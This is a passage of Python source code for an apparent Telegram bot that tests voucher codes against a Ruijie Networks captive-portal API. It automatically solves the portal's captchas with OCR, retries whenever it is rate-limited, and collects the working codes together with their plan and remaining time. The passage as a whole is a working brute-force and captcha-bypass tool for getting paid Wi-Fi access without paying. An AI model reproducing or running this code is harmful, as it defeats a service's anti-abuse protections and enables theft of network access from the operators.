                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    content_type = req.headers.get("Content-Type", "")
                    if req.status in (401, 403):
                        print(f"[voucher] status={req.status}: authentication rejected; stopping this check")
                        return
                    if req.status == 429:
                        print(f"[voucher] status=429: rate limited")
                        response = "request limited"
                    elif req.status >= 500:
                        print(f"[voucher] status={req.status}: upstream service error")
                        response = "upstream service error"
                    elif "json" not in content_type.lower():
                        print(f"[voucher] status={req.status}: unexpected content type {content_type!r}")
                    else:
                        try:
                            resp_json = json.loads(response)
                            print(f"[voucher] code=[redacted] attempt={_attempt+1} status={req.status} resp={resp_json}")
                        except json.JSONDecodeError:
                            print(f"[voucher] status={req.status}: invalid JSON response")
            except Exception as e:
                print(f"[perform_check] request error: {type(e).__name__}: {e}")
                return

        if response and 'captcha' in response:
            print(f"[perform_check] rate limited on code={code}, retrying (attempt {_attempt+1}/3)")
            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
            continue
        break

    if not response:
        return

    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if (
            not current_task
            or current_task.get("scan_id") != scan_id
            or current_task.get("stop")
        ):
            return

    if 'logonUrl' in response:
        if recheck:
            return code

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
        if message:
            try:
                success_messages[chat_id] = await update_chunked_messages(
                    message.chat.id,
                    "Success Codes:",
                    success_texts[chat_id],
                    success_messages.get(chat_id)
                )
            except Exception as e:
                print(f"Success Message Error: {e}")
    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        limited_texts[chat_id].append(f"⚠️ {code}\n   {expire_date}")
        if message:
            try:
                limited_messages[chat_id] = await update_chunked_messages(
                    message.chat.id,
                    "Limited Codes:",
                    limited_texts[chat_id],
                    limited_messages.get(chat_id)
                )
            except Exception as e:
                print(f"Limited Message Error: {e}")

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    hours = int(total_minutes) // 60
    minutes = int(total_minutes) % 60
    if hours > 0 and minutes > 0:
        return f"{hours}h {minutes}m"
    elif hours > 0:
        return f"{hours}h"
    else:
        return f"{minutes}m"

async def Code_Expires_Date(session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId=04ecdc104a99406194f594057b21fd21&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False),
            connector_owner=True,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as fresh_session:
            async with fresh_session.get(
                f"http://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}",
                headers=headers
            ) as req:
                respond = await req.json()
                profile_name = respond.get('result', {}).get('profileName', 'Unknown')
                totaltime = Minute_to_Hour(respond.get('result', {}).get('totalMinutes', 'Unknown'))
                return f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
    except Exception as e:
        print(f"[Code_Expires_Date] error: {e}")
        return "📋 Plan: Unknown | ⏳ Time: Unknown"


_ocr = ddddocr.DdddOcr(show_ad=False)
_ocr_executor = concurrent.futures.ThreadPoolExecutor(max_workers=300)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(_ocr_executor, _ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {
        'sessionId': session_id,
        '_t': str(time.time()),
    }
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        if req.status != 200:
            raise RuntimeError(f"captcha image request failed with HTTP {req.status}")
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {
        'sessionId': session_id,
        'authCode': text,
    }
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        body = await req.text()
        content_type = req.headers.get("Content-Type", "")
        if req.status != 200:
            print(f"[Varify_Captcha] HTTP {req.status}; content_type={content_type}")
            return None
        if "json" not in content_type.lower():
            print(f"[Varify_Captcha] unexpected content type: {content_type}")
            return None
        try:
            data = json.loads(body)
        except json.JSONDecodeError:
            print("[Varify_Captcha] invalid JSON response")
            return None
        print(f"[Varify_Captcha] status={req.status} response={data}")
        return session_id if data.get("success") is True else None


async def start_polling():
    backoff = 5
    while True:
        try:
            print("[polling] Starting infinity_polling...")
            await bot.infinity_polling(timeout=20, request_timeout=35)
            print("[polling] infinity_polling exited cleanly, restarting...")
            await asyncio.sleep(2)
            backoff = 5
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"[polling] Connection error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"[polling] Unexpected error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    await rebuild_session()
    try:
        asyncio.create_task(web_server())
        await start_polling()
    finally:
        if session and not session.closed:
            await session.close()
        if _connector and not _connector.closed:
            await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
